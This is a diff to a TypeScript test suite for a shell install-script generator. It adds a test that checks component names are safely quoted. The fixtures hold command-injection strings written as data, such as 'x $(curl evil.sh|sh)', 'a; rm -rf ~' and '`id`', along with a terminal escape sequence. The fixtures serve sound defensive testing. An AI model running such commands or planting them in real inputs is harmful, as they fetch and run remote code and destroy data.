@@ -71,12 +71,24 @@ describe("plan", () => {
     const other = { id: "b", name: "Line\nbreak; rm -rf /", type: "skill" as const, repo: "x/y" };
     const script = formatInstallScript([item, other], new Map([["a", "mcp:o/r/a-1"], ["b", null]]), "en");
     expect(script.split("\n")).toEqual([
-      "# Plan: 2 components (Medical Component Market)",
-      expect.stringContaining("# Requires the dsh-med CLI"),
-      "dsh-med install 'mcp:o/r/a-1' --profile medical  # PubMed Search",
-      "# Line break; rm -rf /: no upstream install entry; get it from https://github.com/x/y",
+      ": 'Plan: 2 components (Medical Component Market)'",
+      expect.stringMatching(/^: 'Requires the dsh-med CLI/),
+      ": 'PubMed Search'",
+      "dsh-med install 'mcp:o/r/a-1' --profile medical",
+      ": 'Line break; rm -rf /: no upstream install entry; get it from https://github.com/x/y'",
     ]);
     expect(formatInstallScript([item], new Map([["a", "it's"]]), "zh")).toContain("dsh-med install 'it'\\''s' --profile medical");
+  });
+
+  it("never lets upstream text reach the shell unquoted", () => {
+    const hostile = ["Generate H&E annotation", "x $(curl evil.sh|sh)", "a; rm -rf ~", "`id`", "tab\there\u001b[201~", "q'uote\u2028next", "# not a comment"];
+    const items = hostile.map((name, index) => ({ id: `id${index}`, name, type: "skill" as const, repo: index % 2 ? "o/r$(id)" : "o/r" }));
+    const ids = new Map(items.map((entry, index) => [entry.id, index % 3 ? `e'${index}$(x)` : null]));
+    const quoted = "'(?:[^'\\u0000-\\u001f]|'\\\\'')*'";
+    const safeLine = new RegExp(`^(?:: ${quoted}|dsh-med install ${quoted} --profile medical)$`);
+    for (const locale of ["en", "zh"] as const) {
+      for (const line of formatInstallScript(items, ids, locale).split("\n")) expect(line).toMatch(safeLine);
+    }
   });
 
   it("drops malformed or duplicate stored items", () => {
